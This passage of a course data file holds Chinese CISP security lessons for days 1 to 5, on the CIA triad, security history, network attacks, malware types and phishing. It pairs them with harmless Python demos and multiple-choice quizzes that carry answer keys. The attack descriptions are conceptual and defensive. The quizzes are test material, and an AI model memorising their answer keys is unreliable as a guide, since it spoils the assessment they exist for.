print("完整性校验通过: 数据未被篡改")\n        return True\n    \n    def demonstrate_availability(self, service_name):\n        """可用性：冗余机制示例"""\n        servers = {"主服务器": "UP", "备份服务器": "STANDBY"}\n        print(f"服务: {service_name}")\n        for server, status in servers.items():\n            print(f"  {server}: {status}")\n        print("主服务器故障 → 自动切换到备份服务器 → 服务不中断")\n\ninfo = InfoSec_CIA()\nprint("=== 1. 机密性演示 ===")\ninfo.demonstrate_confidentiality("敏感客户数据: 身份证号 110101199001011234")\nprint("\\n=== 2. 完整性演示 ===")\ninfo.demonstrate_integrity("转账金额: 人民币 100,000 元")\nprint("\\n=== 3. 可用性演示 ===")\ninfo.demonstrate_availability("银行核心交易系统")\nprint("\\nCIA三要素: 看不到(C)、改不了(I)、用得了(A)")', description: 'CIA三要素完整演示：加密(机密性)、哈希(完整性)、冗余(可用性)' },
    quiz: [{"id":"q1-1","question":"信息安全的CIA三要素是？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、不可否认性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA=Confidentiality(机密性)+Integrity(完整性)+Availability(可用性)。认证性和不可否认性是扩展属性，非基础三要素。"},{"id":"q1-2","question":"以下哪种情况破坏了信息的完整性？","options":["黑客窃取了客户名单","中间人攻击修改了转账金额","DDoS攻击导致网站无法访问","员工离职前删除所有文件"],"correctIndex":1,"explanation":"修改变造金额属于篡改行为，破坏了完整性。窃取破坏机密性，DDoS破坏可用性。"},{"id":"q1-3","question":"数字签名主要保障CIA中的哪个属性？","options":["机密性","完整性","可用性","上述全部"],"correctIndex":1,"explanation":"数字签名用私钥对哈希值加密，验证时比对哈希，确保数据未被篡改——保障完整性。同时也提供不可否认性。"},{"id":"q1-4","question":"内部威胁相比外部威胁更难防范的根本原因是？","options":["内部人员技术更强","内部人员已拥有合法访问权限","内部人员数量更多","防火墙对内无效"],"correctIndex":1,"explanation":"内部人员工作需要访问权限，合法权限本身就是威胁来源——你不可能不给员工权限。防御靠最小权限+审计+DLP。"},{"id":"q1-5","question":"被动攻击和主动攻击的核心区别？","options":["被动攻击速度更慢","被动攻击只监听不修改，主动攻击会修改系统","被动攻击危害更大","被动攻击技术更高深"],"correctIndex":1,"explanation":"被动攻击（窃听/流量分析）只收集不改变，难以检测；主动攻击（篡改/DoS）会留下痕迹，相对容易检测但危害更直接。"}],
    expertNotes: dayExpertNotes[7],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-2', day: 2, week: 1, title: '信息安全发展历程',
    objectives: ['了解信息安全历史', '理解发展阶段特点', '掌握当前形势'],
    content: '# 信息安全发展历程\n\n> 📋 **本节大纲**\u2003通信安全→计算机安全→网络安全→信息化安全 | 四大阶段核心特征与里程碑 | \n## 🔴 高频考点\n\n· ISO 27001发布年份(2001)、**TCSEC橘皮书发行机构(美国国防部1985)**常考\n· Stuxnet(2010)是世界上第一个物理破坏型网络武器\n· 通用准则CC的国际标准编号是**ISO 15408**，不是ISO 27001\n## 💜 记忆口诀\n\n· **四阶段**："通信→计算→网络→信息"\n· **里程碑**：橘皮书(1985美)→CC(1999国际)→ISO27001(2001)→震网(2010)→WannaCry(2017)\n学习建议\n\n## 概述\n\n信息安全不是一成不变的概念——它随着技术进步和威胁演变经历了四个重要阶段。理解这段历史有助于理解当今安全体系的来龙去脉。CISP考试虽然不直接考历史年份，但每个发展阶段的核心特点和安全标准是重要知识点。\n\n## 第一阶段：通信安全（1940s-1960s）\n\n### 核心特征：密码技术主导\n\n这个阶段信息安全≈通信保密。主要需求来自军事和外交领域——确保无线电通信不被敌方截获破译。\n\n**代表性成就：**\n- 1949年：克劳德·香农发表《通信的数学理论》，奠定了现代密码学的数学基础\n- 二战期间：德国Enigma密码机 vs 英国图灵团队的破解——最早的"攻防对抗"\n- DES加密标准的研发起步（最终于1977年成为美国联邦标准）\n\n**这个阶段的局限：**仅关注传输过程的保密，不考虑存储安全、身份认证、防篡改等其他维度。\n\n## 第二阶段：计算机安全（1970s-1990s）\n\n### 核心特征：从通信到系统的转变\n\n随着大型计算机和数据库的普及，安全焦点从"传输保密"扩展到"系统级安全"——关注谁可以访问计算机、访问什么、如何审计。\n\n**里程碑式的安全标准：**\n- **TCSEC（橘皮书）**：1985年美国国防部发布，定义了从D到A1的七个安全等级，是世界上第一套系统性的计算机安全评估标准\n- **ITSEC**：1991年欧洲发布，首次提出"功能"和"保证"分离的概念\n- **通用准则CC（ISO 15408）**：1999年发布，融合了TCSEC和ITSEC，成为国际通用的IT安全评估标准\n\n**TCSEC安全等级速记：**\nD级最低保护 → C1/C2级自主访问控制（商用）→ B1/B2/B3级强制访问控制（军事级）→ A1级可验证保护（最高，需形式化数学证明）\n\n**这个阶段的贡献：**首次系统性地定义了"什么是安全的计算机系统"。\n\n## 第三阶段：网络安全（2000s-2010s）\n\n### 核心特征：互联网时代的安全挑战\n\n互联网的爆炸式增长彻底改变了安全格局——攻击面从"单台计算机"扩展到"全球互联的网络"。攻击者不再需要物理接触目标，远程攻击成为主流。\n\n**标志性事件：**\n- **2001年**：ISO 27001信息安全管理体系标准发布，安全管理从此有了国际标准框架\n- **2007年**：爱沙尼亚遭受大规模DDoS攻击——第一次国家级别的网络战\n- **2010年**：Stuxnet震网蠕虫——第一种被证实能破坏物理设备的网络武器（破坏了伊朗核离心机）\n- **2013年**：斯诺登事件——大规模监控和隐私问题成为全球焦点\n- **2017年**：WannaCry勒索软件爆发——利用NSA泄露的EternalBlue漏洞，全球150个国家受影响\n\n**这个阶段的技术变革：**\n防火墙从包过滤发展到NGFW（下一代防火墙）→ IDS/IPS成为企业标配 → SIEM日志分析平台兴起 → 云计算的普及带来全新的共享责任安全模型\n\n## 第四阶段：信息化安全（2020s至今）\n\n### 核心特征：全面、主动、智能\n\n安全不再是IT部门的专属职责，而是上升到组织治理层面。隐私保护、合规管理、供应链安全成为董事会议题。\n\n**五大趋势：**\n\n**1. 零信任架构（Zero Trust）：**\n- 理念："永不信任，始终验证"，不再区分"内网=安全、外网=危险"\n- Google BeyondCorp是标杆实践\n\n**2. AI+安全：**\n- 攻击方：AI生成逼真的钓鱼邮件、自动发现漏洞\n- 防御方：AI检测异常行为、自动化威胁响应\n\n**3. 隐私保护合规全球化：**\n- GDPR（欧盟2018）→ PIPL（中国2021）→ 各国竞相立法\n- 数据跨境传输受到严格管控\n\n**4. 云原生安全：**\n- 容器、K8s、Serverless带来新攻击面\n- DevSecOps将安全嵌入开发全流程\n\n**5. 供应链安全升温：**\n- SolarWinds（2020）→ xz-utils后门（2024）——攻击者不再攻击最终目标，转而攻击其软件供应商\n\n## 学习建议\n\n- 记住四个阶段：通信安全→计算机安全→网络安全→信息化安全\n- TCSEC橘皮书是第一个安全评估标准（美国1985），记住"橘皮书"\n- 通用准则CC是目前国际标准（ISO 15408）\n- Stuxnet是世界上第一个物理破坏型的网络武器\n- 零信任是当前安全架构的核心趋势',
    codeExample: { language: 'python', code: '# 信息安全四个阶段\neras = [\n    ("1940s-1960s", "通信安全", "密码技术"),\n    ("1970s-1990s", "计算机安全", "系统安全"),\n    ("2000s-2010s", "网络安全", "防护技术"),\n    ("2020s至今", "信息化安全", "全面安全")\n]\n\nprint("信息安全发展历程")\nprint("=" * 50)\nfor period, name, focus in eras:\n    print(f"{period}: {name} - {focus}")', description: '展示信息安全发展阶段' },
    quiz: [{"id":"q2-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q2-2","question":"以下关于信息安全发展历程的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q2-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q2-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q2-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[2],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-3', day: 3, week: 1, title: '网络安全基本概念',
    objectives: ['理解网络协议', '了解攻击类型', '掌握防护基础'],
    content: '# 网络安全基本概念\n\n> 📋 **本节大纲**\u2003OSI七层模型详解 | TCP/IP四层对比 | 三大经典网络攻击(SYN Flood/DNS/ARP) | 防护技术速查\n\n## 概述\n\n网络是信息系统运行的载体，理解网络协议是理解网络安全的前提。OSI七层模型和TCP/IP四层模型为我们提供了系统化的分析框架——虽然实际网络并不严格遵循OSI分层，但分层模型帮助我们从每一层的视角分析安全风险和控制措施。\n\n## OSI七层模型详解\n\nOSI（开放系统互联）由ISO定义，将网络通信分为七个层次，每层为上层提供标准化服务。\n\n### 第7层：应用层\n**功能：**为应用软件提供网络服务接口。**协议：**HTTP/HTTPS、DNS、SMTP、FTP、SSH。\n**安全威胁：**SQL注入、XSS、CSRF、DNS劫持、邮件伪造。**防御：**WAF、输入验证、DNSSEC。\n\n### 第6层：表示层\n**功能：**数据格式转换、加密/解密、编码/解码。**安全威胁：**SSL剥离攻击（降级HTTPS为HTTP）、字符编码绕过。**防御：**HSTS强制HTTPS、统一编码标准。\n\n### 第5层：会话层\n**功能：**建立、管理、终止应用间会话。**安全威胁：**会话劫持、会话重放。**防御：**会话超时、令牌绑定设备指纹、加密。\n\n### 第4层：传输层\n**功能：**端到端数据传输，TCP面向连接可靠、UDP无连接快速。**协议：**TCP（三次握手）、UDP。\n**安全威胁：**SYN Flood（半连接耗尽，CISP最高频考点）、TCP会话劫持（猜序列号）、端口扫描。**防御：**SYN Cookie、限速、TLS加密。\n\n### 第3层：网络层\n**功能：**跨网络路由数据包，IP地址寻址。**协议：**IPv4/v6、ICMP（Ping）、ARP（IP→MAC）。\n**安全威胁：**IP欺骗（伪造源IP）、ICMP隧道（封装恶意数据）、ARP欺骗（中间人）。**防御：**IPSec、包过滤、静态ARP。\n\n### 第2层：数据链路层\n**功能：**相邻节点间可靠传输数据帧，MAC地址寻址。**协议：**以太网、WiFi（802.11）。\n**安全威胁：**MAC欺骗、ARP欺骗、VLAN跳跃。**防御：**端口安全、DAI动态ARP检测、802.1X认证。\n\n### 第1层：物理层\n**功能：**在物理介质上传输比特流（0和1）。**设备：**网线、光纤、集线器。\n**安全威胁：**线路窃听（物理搭线）、电磁泄漏（TEMPEST）。**防御：**光纤替代铜缆、电磁屏蔽。\n\n**OSI记忆口诀（从下到上）：**物理·链路·网络·传输·会话·表示·应用（"物链网传会表示"）\n\n## TCP/IP四层模型\n\n| TCP/IP层 | OSI层 | 核心协议 | 安全关注 |\n|----------|-------|---------|---------|\n| 应用层 | 5-7层 | HTTP/DNS/SMTP | Web安全、邮件安全 |\n| 传输层 | 4层 | TCP/UDP | 端口安全、DoS防护 |\n| 网际层 | 3层 | IP/ICMP | IP欺骗、路由安全 |\n| 网络接口层 | 1-2层 | Ethernet/WiFi | 物理访问、MAC安全 |\n\n**OSI vs TCP/IP：**OSI是理论模型（先建模后实现，7层），TCP/IP是实践模型（先实现后总结，4层）。实际网络不用OSI协议栈，但用OSI概念教学。\n\n## 三大经典网络攻击\n\n### SYN Flood（半连接攻击）\n**原理：**攻击者发送大量SYN包请求连接→服务器分配资源回复SYN-ACK→攻击者故意不回复最后ACK→服务器半连接队列被填满→无法响应正常请求。**防御：**SYN Cookie（不在ACK前分配资源）、CDN、限速。\n\n### DNS欺骗\n**原理：**攻击者伪造DNS响应，或污染DNS缓存，将用户导向虚假网站。**防御：**DNSSEC（DNS数字签名）、DoH/DoT加密DNS查询。\n\n### ARP欺骗\n**原理：**攻击者伪造ARP响应，声称"网关IP的MAC是我"，导致受害者流量被引向攻击者。**危害：**中间人窃听和篡改所有通信。**防御：**静态ARP表、DAI动态ARP检测、使用交换机而非Hub。\n\n## 防护技术速查\n\n**防火墙：**包过滤（网络层）→ 状态检测（传输层，跟踪连接状态）→ NGFW下一代防火墙（应用层识别）\n**IDS/IPS：**IDS旁路部署仅告警，IPS串联部署可阻断\n**IPSEC VPN：**AH认证头（完整性）+ESP封装安全载荷（加密+认证），站点到站点隧道\n\n## \n## 🔴 高频考点\n\n· **SYN Flood攻击原理**最高频考点——利用TCP三次握手缺陷，发SYN不回ACK耗尽半连接队列\n· OSI七层从下到上：**物·链·网·传·会·表·应**，每层代表性协议要能对上\n· IDS（旁路部署只告警）vs IPS（串联部署可阻断），这道辨析题几乎必考\n## 💜 记忆口诀\n\n· **OSI七层**："物·链·网·传·会·表·应"\n· **SYN Flood**："我SYN你SYN-ACK你，但我永远不ACK"\n· **IDS/IPS区别**："IDS旁路看、IPS串联拦"\n学习建议\n- OSI七层从下到上的名称和各层协议要记住\n- SYN Flood是最高频考点，理解三次握手缺陷\n- ARP欺骗是局域网中间人攻击的经典手段\n- IDS只告警、IPS可阻断这个区别非常关键',
    codeExample: { language: 'python', code: '# 端口状态检测示例\nimport socket\n\ndef check_port(host, port):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((host, port))\n        sock.close()\n        return "开放" if result == 0 else "关闭"\n    except:\n        return "错误"\n\nports = {80: "HTTP", 443: "HTTPS", 22: "SSH", 3306: "MySQL"}\nfor port, service in ports.items():\n    print(f"端口 {port} ({service}): {check_port(\"127.0.0.1\", port)}")', description: '演示端口检测' },
    quiz: [{"id":"q3-1","question":"以下哪种防火墙类型工作在OSI第4层？","options":["应用层防火墙","状态检测防火墙","代理防火墙","WAF"],"correctIndex":1,"explanation":"状态检测防火墙工作在传输层（第4层）。"},{"id":"q3-2","question":"IDS和IPS的主要区别是？","options":["IDS可以阻断攻击","IPS可以阻断攻击，IDS只能检测告警","两者功能完全相同","IDS比IPS更安全"],"correctIndex":1,"explanation":"IPS可以主动阻断攻击，IDS只能检测和告警。"},{"id":"q3-3","question":"TCP三次握手中，第二次握手发送的标志位是？","options":["SYN","ACK","SYN+ACK","FIN"],"correctIndex":2,"explanation":"第二次握手服务器回复SYN+ACK。"},{"id":"q3-4","question":"DNS欺骗攻击属于什么类型的攻击？","options":["物理攻击","中间人攻击","密码攻击","社会工程攻击"],"correctIndex":1,"explanation":"DNS欺骗通过伪造DNS响应属于中间人攻击。"},{"id":"q3-5","question":"防火墙默认策略应遵循什么原则？","options":["默认允许","默认拒绝","只允许80端口","按需决定"],"correctIndex":1,"explanation":"安全最佳实践：默认拒绝所有，按需开放。"}],
    expertNotes: dayExpertNotes[3],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-4', day: 4, week: 1, title: '恶意软件分类与防范',
    objectives: ['了解恶意软件类型', '理解传播方式', '掌握防范措施'],
    content: '# 恶意软件分类与防范\n\n> 📋 **本节大纲**\u2003病毒·蠕虫·木马·勒索软件·间谍软件·Rootkit 六大类型 | 传播方式对比表 | 防范体系\n\n## 概述\n\n恶意软件（Malware = Malicious Software）是所有恶意程序的统称。不同的恶意软件采用不同的传播方式和破坏手段——理解它们的区别是选择正确防御策略的前提。CISP考试中经常考查病毒（需要宿主）和蠕虫（独立传播）的核心区别，以及勒索软件的防范措施。\n\n## 六大恶意软件类型\n\n### 一、病毒（Virus）\n\n**核心特征：需要宿主文件，不能独立运行。**\n\n病毒将自己嵌入到合法程序或文件中（如Word宏、可执行文件、引导扇区），当用户执行或打开感染文件时，病毒代码才被激活并感染更多文件。\n\n**传播方式：**\n- 通过移动介质（U盘/移动硬盘）复制感染文件\n- 通过邮件附件发送被感染的文件\n- 通过文件共享网络传播\n\n**典型案例：**\n- **CIH病毒（1998）：**能破坏BIOS的病毒，4月26日触发\n- **宏病毒：**利用Office宏功能，感染Word/Excel文档\n- **引导区病毒：**感染硬盘主引导记录（MBR），开机即激活\n\n**防御：**杀毒软件（AV）扫描、不运行来源不明的可执行文件、禁用Office宏（或仅允许签名宏）\n\n### 二、蠕虫（Worm）\n\n**核心特征：独立程序，能自动通过网络传播，不需要宿主。**\n\n蠕虫与病毒的本质区别——病毒需要"搭便车"（嵌入宿主文件），蠕虫自己就是"自驾车"（独立程序自动扩散）。\n\n**传播机制：**\n- 利用操作系统或网络服务的漏洞自动扫描并感染其他主机\n- 无需用户交互就能传播——这是其危险性的根源\n\n**史上著名蠕虫案例：**\n- **Morris蠕虫（1988）：**最早的网络蠕虫，感染了当时互联网10%的机器，导致互联网首次大规模瘫痪\n- **CodeRed（2001）：**利用IIS服务器漏洞，13小时内感染36万台服务器\n- **SQL Slammer（2003）：**史上传播最快的蠕虫——10分钟内感染全球75,000台服务器\n- **Conficker（2008）：**感染了数千万台Windows机器，至今仍有活跃变种\n\n**防御：**及时打补丁关闭蠕虫利用的漏洞、网络分段限制传播、IDS监控异常扫描行为\n\n### 三、木马（Trojan Horse）\n\n**核心特征：伪装成合法软件，欺骗用户主动安装。**\n\n名称来源于特洛伊木马——表面是礼物（免费软件、游戏外挂、破解工具），实际内部藏有恶意代码。与病毒和蠕虫不同，木马通常不会自我复制。\n\n**常见子类型：**\n- **下载者（Downloader）：**安装后从远程服务器下载更多恶意软件\n- **后门木马（Backdoor）：**在被感染机器上开放远程控制通道\n- **银行木马（Banker）：**专门窃取网银凭证（如Zeus/SpyEye）\n- **信息窃取木马（Infostealer）：**窃取密码、Cookie、浏览器历史\n\n**感染途径：**\n- 下载来源不明的"破解版"软件\n- 点击广告弹窗下载"系统优化工具"\n- 看似合法来源的邮件附件\n\n**防御：**只从官方渠道下载软件、不运行"破解版"、杀毒软件+行为检测\n\n### 四、勒索软件（Ransomware）\n\n**核心特征：加密受害者文件，要求支付赎金（通常比特币）才提供解密密钥。**\n\n这是近年来增长最快、危害最大的恶意软件类型。\n\n**攻击流程：**\n1. 通过钓鱼邮件或漏洞入侵系统\n2. 横向移动到更多机器\n3. 加密文件（AES/RSA）并显示勒索信息\n4. 要求72小时内支付赎金，逾期翻倍或永久删除密钥\n\n**著名案例：**\n- **WannaCry（2017）：**利用EternalBlue漏洞，72小时内感染150+国家、20万+台机器。赎金仅300美元比特币，但造成估计40亿美元损失\n- **NotPetya（2017）：**伪装成勒索软件的国家级破坏工具，实际不可解密——目标是破坏而非勒索\n- **Ryuk：**瞄准大型企业和政府机构，单次赎金可达数百万美元\n\n**防御策略（3-2-1则都是基本）：**\n1. **备份！备份！备份！**——3-2-1规则（3份副本、2种介质、1份异地）\n2. 邮件过滤+安全意识培训——大部分勒索软件通过钓鱼邮件进入\n3. 及时打补丁——WannaCry利用的漏洞在攻击前2个月已有补丁\n4. 最小权限原则——限制加密能影响的范围\n5. EDR（端点检测响应）——行为分析检测加密行为\n\n### 五、间谍软件（Spyware）\n\n**核心特征：隐蔽监控用户活动，窃取敏感信息。**\n\n- 键盘记录器（Keylogger）：记录所有键盘敲击，捕获密码和信用卡号\n- 屏幕截获：定时截屏上传\n- 浏览器劫持：修改浏览器主页、搜索引擎、植入广告\n\n**防御：**反间谍软件（如Windows Defender）、不安装来源不明的浏览器插件\n\n### 六、Rootkit\n\n**核心特征：隐藏自身及其他恶意软件的存在，逃避检测。**\n\nRootkit通过修改操作系统内核或驱动程序，使得杀毒软件和系统工具（如任务管理器、文件浏览器）无法看到恶意文件和进程。\n\n**防御：**安全启动（Secure Boot）、内核完整性检查、专业Rootkit检测工具\n\n## 传播方式总结\n\n| 传播途径 | 涉及恶意软件类型 | 防御 |\n|---------|----------------|------|\n| 电子邮件附件 | 病毒、蠕虫、勒索 | 邮件网关过滤+用户培训 |\n| 恶意网站 | 木马、勒索 | URL过滤+浏览器沙箱 |\n| USB设备 | 病毒、蠕虫 | 禁用自动运行+USB扫描 |\n| 漏洞利用 | 蠕虫 | 补丁管理+IDS/IPS |\n| 社会工程 | 木马、勒索 | 安全意识培训 |\n\n## 防范体系\n\n**技术层面：**\n- 杀毒/EDR（端点检测响应）实时监控\n- 防火墙阻断恶意网络通信\n- 补丁管理自动化（WSUS/SCCM）\n- 邮件安全网关（SPF/DKIM/DMARC）\n\n**管理层面：**\n- 安全意识培训（识别钓鱼邮件）\n- 最小权限原则（限制感染扩散）\n- 定期备份（勒索软件最后防线）\n- 事件响应计划（被感染后怎么办）\n\n**CISP考点记忆：病毒需要宿主，蠕虫独立传播——这是必考题。**\n\n## \n## 🔴 高频考点\n\n· **病毒需要宿主、蠕虫独立传播**——CISP最常考的核心判断题\n· WannaCry(2017)利用EternalBlue漏洞(MS17-010)，补丁在攻击前2个月已发布\n· 勒索软件的终极防线是**备份**，3-2-1规则是黄金标准\n## 💜 记忆口诀\n\n· **病毒vs蠕虫**："毒要搭车(需宿主)、虫自驾游(独立传播)"\n· **恶意软件**：Virus(毒/寄生)→Worm(虫/自传)→Trojan(木马/伪装)→Ransomware(勒索/加密)\n学习建议\n- 病毒vs蠕虫的最核心区别：需不需要宿主文件\n- WannaCry利用了EternalBlue漏洞（MS17-010）\n- 勒索软件的终极防线是备份\n- Rootkit的特点：隐藏自身，逃避检测',
    codeExample: { language: 'python', code: '# 恶意软件特征分析\ndef analyze_file(filename, file_info):\n    risks = []\n    if file_info.get("size", 0) > 100 * 1024 * 1024:\n        risks.append("异常大文件")\n    if file_info.get("ext", "") in [".exe", ".scr", ".bat"]:\n        risks.append("可执行文件")\n    if file_info.get("unsigned", False):\n        risks.append("未数字签名")\n    return risks\n\ntest_file = {"size": 15 * 1024 * 1024, "ext": ".exe", "unsigned": True}\nprint(f"风险评估: {analyze_file(\"test.exe\", test_file)}")', description: '模拟恶意软件检测' },
    quiz: [{"id":"q4-1","question":"病毒和蠕虫的主要区别是？","options":["病毒需要宿主文件，蠕虫独立传播","蠕虫需要宿主文件，病毒独立传播","两者完全相同","病毒只能感染Linux"],"correctIndex":0,"explanation":"病毒需要依附宿主文件传播，蠕虫是独立程序。"},{"id":"q4-2","question":"勒索软件的主要攻击手段是？","options":["删除用户文件","加密用户文件并索要赎金","窃取用户密码","占用网络带宽"],"correctIndex":1,"explanation":"勒索软件加密用户文件并要求支付赎金才能解密。"},{"id":"q4-3","question":"以下哪种恶意软件会记录用户键盘输入？","options":["广告软件","间谍软件（键盘记录器）","蠕虫","勒索软件"],"correctIndex":1,"explanation":"间谍软件中的键盘记录器（Keylogger）会记录用户的键盘输入。"},{"id":"q4-4","question":"木马程序的主要特点是？","options":["自我复制","伪装成合法软件","加密文件","占用CPU"],"correctIndex":1,"explanation":"木马程序伪装成合法软件，不自我复制。"},{"id":"q4-5","question":"防范恶意软件最有效的组合是？","options":["只装杀毒软件","杀毒软件+防火墙+用户安全意识","只用防火墙","不需要任何防护"],"correctIndex":1,"explanation":"技术手段（杀毒软件、防火墙）和人员意识相结合。"}],
    expertNotes: dayExpertNotes[4],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-5', day: 5, week: 1, title: '社会工程学攻击',
    objectives: ['理解社会工程学', '了解常见手法', '掌握防范技巧'],
    content: '# 社会工程学攻击\n\n> 📋 **本节大纲**\u2003三大心理原理(信任/好奇/恐惧) | 五大手法(钓鱼/鱼叉/鲸钓/电话诈骗/尾随) | 防范体系\n\n## 概述\n\n社会工程学（Social Engineering）被称为"最危险的漏洞是人"。攻击者不直接攻击技术系统，而是利用人性的弱点——好奇心、恐惧、贪婪、信任——操纵人员主动泄露信息或执行危险操作。据统计，超过90%的网络攻击都包含社会工程学成分。CISP考试对钓鱼攻击的分类和防范措施是重要考点。\n\n## 社会工程学三大心理原理\n\n### 一、获得信任（建立可信身份）\n\n攻击者通过伪装成可信赖的角色降低受害者的警惕性：\n- 伪装IT部门："您好，我是IT部小王，您的电脑有安全告警，需要远程检查"\n- 利用权威身份："我是王总，紧急转账到这个账户"（CEO诈骗/BEC诈骗）\n- 建立友好关系：长期在社交媒体上与目标互动，逐渐获取信任\n\n**防御：**必须通过独立渠道（如已知电话号码回拨）验证身份，不能仅靠来电/邮件中提供的信息\n\n### 二、利用好奇心或贪婪\n\n\"点击领取100元优惠券\"、\"观看独家曝光视频\"、\"您的包裹无法派送请查看\"——这些诱饵利用的是人们难以抑制的好奇心和占便宜心理。\n\n### 三、制造恐惧或紧迫感\n\n\"您的银行账户已被冻结，请立即验证\"、\"你的电脑感染了病毒，请即刻下载杀毒工具\"——迫使用户在恐惧和压力下不经思考就执行操作。\n\n**防御：**任何制造紧迫感的请求都应暂停，深呼吸，冷静判断——真正的机构不会通过恐吓方式沟通。\n\n## 五大攻击手法\n\n### 一、网络钓鱼（Phishing）——最常见\n\n**手法：**大量群发看似合法的邮件（银行/快递/税务局），诱导点击链接或下载附件。\n**特征：**发件人地址近似但不完全相同（amazon-support@amaz0n.com）、语法错误、泛称而非你的真名。\n**后果：**链接导向虚假登录页→输入密码→账户被盗；附件含恶意软件→电脑被控。\n\n### 二、鱼叉式钓鱼（Spear Phishing）——定制化高效攻击\n\n**与普通钓鱼的核心区别：**不是群发而是针对特定个人或组织，攻击前会进行信息收集。\n**手法：**研究目标社交媒体、职位、同事名字，定制高度逼真的诱饵邮件。\n**案例：**攻击者知道你刚参加完行业会议，发来"会议资料请查收"的邮件——成功率远高于泛称的钓鱼。\n**防御：**只有"内容太精准了"反而要警惕。通过其他渠道（如Slack/Teams）确认发件人是否真的发了邮件。\n\n### 三、鲸钓（Whaling）——针对高管的钓鱼\n\n**目标：**CEO、CFO等高管，追求的是单次高价值回报（如授权大额转账）。\n**手法：**伪装银行或监管机构，发送法律传票或合规通知，利用高管对法律后果的恐惧。\n\n### 四、电话诈骗（Vishing = Voice Phishing）\n\n**手法：**冒充银行客服、公安、税务局，声称"你的银行账户涉嫌洗钱需要配合调查"。\n**技术辅助：**伪造来电显示（显示为110或银行官方号码）。\n**防御：**挂断后主动拨打官方客服电话验证。官方机构不会通过电话索要密码或验证码。\n\n### 五、尾随/肩窥（Tailgating / Shoulder Surfing）——物理社会工程\n\n**尾随：**跟随刷卡进入的员工通过门禁——"能帮我开下门吗，忘带卡了"。**肩窥：**在公共场合偷窥他人屏幕上的密码、邮件等敏感信息。\n**防御：**严格执行一人一卡、可疑人员主动询问、防窥屏贴膜\n\n## 防范体系\n\n**最重要：安全意识培训——人员是社会工程学的唯一防线。**\n\n**技术措施：**\n- 邮件安全网关：SPF/DKIM/DMARC防邮件伪造\n- URL过滤：阻断已知钓鱼网站\n- MFA多因素认证：即使密码泄露，攻击者也无法登录\n- 沙箱：可疑附件在隔离环境中打开检测\n\n**管理措施：**\n- 大额转账必须双重确认（电话+审批）\n- 定期钓鱼演练，统计点击率并针对性培训\n- 建立"可疑行为报告"的便捷渠道\n\n## \n## 🔴 高频考点\n\n· 普通钓鱼(群发) vs **鱼叉钓鱼(定制+信息收集)** vs 鲸钓(高管)——三类钓的区分层次常考\n· 社会工程学利用的是**人性弱点**而非技术漏洞，**安全意识培训**是唯一有效长期防御\n· Spear Phishing(鱼叉式)和Whaling(鲸钓)的英文名称要能对上\n## 💜 记忆口诀\n\n· **三类钓鱼**："普通撒网、鱼叉瞄准、鲸钓大鱼(高管)"\n· 